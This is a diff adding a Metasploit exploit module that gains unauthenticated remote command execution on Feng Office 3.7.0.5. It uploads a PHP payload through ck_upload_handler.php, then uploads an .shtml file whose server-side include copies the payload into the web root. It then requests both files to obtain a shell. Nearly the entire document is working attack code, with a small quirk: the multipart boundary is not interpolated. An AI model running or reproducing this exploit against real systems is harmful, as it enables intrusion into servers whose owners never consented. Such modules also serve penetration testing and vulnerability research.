@@ -1,0 +1,137 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'uri'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+    def initialize
+    super(
+      'Name'           => 'Feng Office 3.7.0.5 - (Unauthenticated) Remote Command Execution',
+      'Description'    => %q{
+        This module exploits arbitrary file upload vulnerability in Feng Office 3.7.0.5. 
+        Application allows the unauthenticated users to upload arbitrary files. 
+        There is no control of any session. All files are sent under "/tmp" directory.
+        The ".htaccess" file under the "/tmp" directory prevents files with the "php,php2,php3.." extensions.
+        This exploit creates the php payload and moves the payload to the main directory via "shtml".
+        After moving the php payload to the main directory, Exploit executes payload and receives shell.
+      },
+      'Author'         => [
+        'AkkuS <Özkan Mustafa Akkuş>', # Vulnerability Discovery, PoC & Msf Module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['URL', 'https://pentest.com.tr/exploits/Feng-Office-3-7-0-5-Unauthenticated-Remote-Command-Execution-Metasploit.html'], 
+        ],
+      'Platform'       => ['php'],
+      'Arch'           => ARCH_PHP,
+      'Targets'        =>
+        [
+          ['Feng Office  <= 3.7.0.5', {}]
+        ],
+      'DisclosureDate' => '28 Feb 2019',
+      'Privileged'     => false,      
+      'DefaultTarget' => 0
+       )
+
+    register_options(
+        [
+          OptString.new('TARGETURI', [true, 'The base path to Feng Office', '/']),
+        ], self.class)
+    end
+
+  def exploit 
+##
+# Upload Payload and directory discovery
+## 
+    boundary = Rex::Text.rand_text_alphanumeric(29)
+    
+    data = "-----------------------------{boundary}\r\n"
+    data << "Content-Disposition: form-data; name=\"upload\"; filename=\"akkus.php\"\r\n"
+    data << "Content-Type: binary/octet-stream\r\n\r\n"
+    data << payload.encoded
+    data << "\n\r\n-----------------------------{boundary}--\r\n"
+
+
+    data << "-----------------------------{boundary}--\r\n"
+
+    res = send_request_cgi({
+      'method' => 'POST',    
+      'data'  => data,
+      'headers' =>
+      {
+        'Content-Type'   => 'multipart/form-data; boundary=---------------------------{boundary}'
+      },
+      'uri' => normalize_uri(target_uri, "/ck_upload_handler.php")     
+    })
+
+
+        if not (res and res.body =~ /tmp\/([^\"]+)\',/)
+            print_error("Something went wrong. PHP File Upload failed.")
+            return nil
+        end
+    upfile = $1
+    print_status("PHP Payload: #{upfile}")
+
+    updir = res.body.scan(/<b>.+ck_upload_handler.php/).map{ |s| s.split("in ").last }.map{ |s| s.split("<b>").last }.map{ |s| s.split("ck_upload_handler.php").last }
+    dirc = updir[0]
+    print_status("Application Directory Path: #{dirc}")
+##
+# Upload shtml and run CMD command to move Payload to the main directory
+## 
+
+    data = "-----------------------------{boundary}\r\n"
+    data << "Content-Disposition: form-data; name=\"upload\"; filename=\"akkus.shtml\"\r\n"
+    data << "Content-Type: text/html\r\n\r\n<html>\r\n<!--#exec cmd=\""
+    data << "cp #{dirc}tmp/#{upfile} #{dirc}"
+    data << "\" -->\r\n</html>\n\r\n"
+    data << "-----------------------------{boundary}--\r\n"
+
+    res = send_request_cgi({
+      'method' => 'POST',    
+      'data'  => data,
+      'headers' =>
+      {
+        'Content-Type'   => 'multipart/form-data; boundary=---------------------------{boundary}'
+      },
+      'uri' => normalize_uri(target_uri, "/ck_upload_handler.php")     
+    })
+
+        if not (res and res.body =~ /tmp\/([^\"]+)\',/)
+            print_error("Something went wrong. sHTML file Upload failed.")
+            return nil
+        else
+          print_good("Uploads successful completed.") 
+        end
+    upfile2 = $1
+    print_status("SHTML Payload: #{upfile2}")
+    print_good("#{peer} - Retrieving remote command shell...")
+    
+##
+# Running shtml for file migration
+##             
+    send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri, "/tmp/#{upfile2}"),
+    })
+##
+# Running php for remote shell
+##     
+    send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri, "/#{upfile}"),
+    })
+   
+  end    
+end
+##
+# End
+##
